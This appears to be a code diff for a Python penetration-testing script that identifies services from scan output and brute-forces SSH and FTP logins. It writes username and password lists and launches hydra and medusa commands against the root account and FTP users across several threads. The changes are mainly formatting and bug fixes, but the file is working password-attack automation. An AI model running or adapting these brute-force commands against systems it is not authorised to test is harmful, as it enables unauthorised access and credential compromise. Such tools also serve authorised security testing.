@@ -24,10 +24,9 @@ for tool in crack_software:
 
 
 def id_services(scandir):
-    print("{0}[+]{1} Checking for Potential Software to Brute Force".format(bcolors.GREEN, bcolors.ENDC))
+    print("{0}[>]{1} Checking for Potential Software to Brute Force".format(bcolors.BLUE, bcolors.ENDC))
     # Variables
     global service_dict
-    global script_dict
     service_dict = {}
     
     # Generate basic mapping of ports to services
@@ -48,14 +47,14 @@ def id_services(scandir):
             else: pass
             
     if len(service_dict) > 0:
-        print("{0}[+]{1} Running Brute Force on {2} Services\n".format(bcolors.GREEN, bcolors.ENDC, str(len(service_dict))))
+        print("{0}[>]{1} Running Brute Force on {2} Services\n".format(bcolors.BLUE, bcolors.ENDC, str(len(service_dict))))
 
 
 def crack_services((ipaddr, scandir, service, port, quiet)):
     if ('ssh' == service) or ('ssh' in service):
         if ('hydra' in installed_tools):
-            SSH_CRACK = 'hydra -f -V -t 1 -l root -P {2}/passlist.txt -s {0} {1} ssh | tee {2}/hydra.txt'
-                .format(port, ipaddr, scandir)
+            SSH_CRACK = 'hydra -f -V -t 1 -l root -P {2}/passlist.txt -s {0} {1} ssh | tee {2}/hydra.txt'.format(
+                    port, ipaddr, scandir)
             if quiet is not True:
                 print("{0}[+]{1} Running Hydra Against SSH".format(bcolors.GREEN, bcolors.ENDC))
             else: pass
@@ -71,7 +70,8 @@ def crack_services((ipaddr, scandir, service, port, quiet)):
         else: pass
         
         if ('medusa' in installed_tools):
-            SSH_CRACK = 'medusa -u root -p {2}/passlist.txt -e ns -h {0} - {1} -M ssh | tee {2}/medusa.txt'.format(ipaddr, port, scandir)
+            SSH_CRACK = 'medusa -u root -p {2}/passlist.txt -e ns -h {0} - {1} -M ssh | tee {2}/medusa.txt'.format(
+                    ipaddr, port, scandir)
             if quiet is not True:
                 print("{0}[+]{1} Running Medusa Against SSH".format(bcolors.GREEN, bcolors.ENDC))
             else: pass
@@ -88,7 +88,8 @@ def crack_services((ipaddr, scandir, service, port, quiet)):
         
     elif ('ftp' == service) or ('ftp' in service):
         if ('hydra' in installed_tools):
-            FTP_CRACK = 'hydra -L {0}/userlist.txt -P {0}/passlist.txt -f -o {0}/ftphydra.txt -u {1} -s {2}'.format(scandir, ipaddr, port)
+            FTP_CRACK = 'hydra -L {0}/userlist.txt -P {0}/passlist.txt -f -o {0}/ftphydra.txt -u {1} -s {2}'.format(
+                    scandir, ipaddr, port)
             if quiet is not True:
                 print("{0}[+]{1} Running Hydra Against FTP".format(bcolors.GREEN, bcolors.ENDC))
             else: pass
@@ -122,15 +123,15 @@ def crack_services((ipaddr, scandir, service, port, quiet)):
         else: pass
         
         
-def crack(ipaddr, scandir, quiet):
+def brute_force(ipaddr, scandir, quiet):
     # Write top_shorthand usernames and passwords to file
     with open(scandir + '/userlist.txt', 'w+') as userfile:
         for i in userlist:
-            i.write(userfile)
+            userfile.write(i + '\n')
     with open(scandir + '/passlist.txt', 'w+') as passfile:
         for i in passlist:
-            i.write(passfile)
-    
+            passfile.write(i + '\n') 
+
     id_services(scandir)
     jobs = []
     for service in service_dict:
@@ -139,4 +140,4 @@ def crack(ipaddr, scandir, quiet):
             jobs.append((ipaddr, scandir, service, port, quiet))
             
     pool = ThreadPool(4)
-    pool.map(tool_scans, jobs)
+    pool.map(crack_services, jobs)
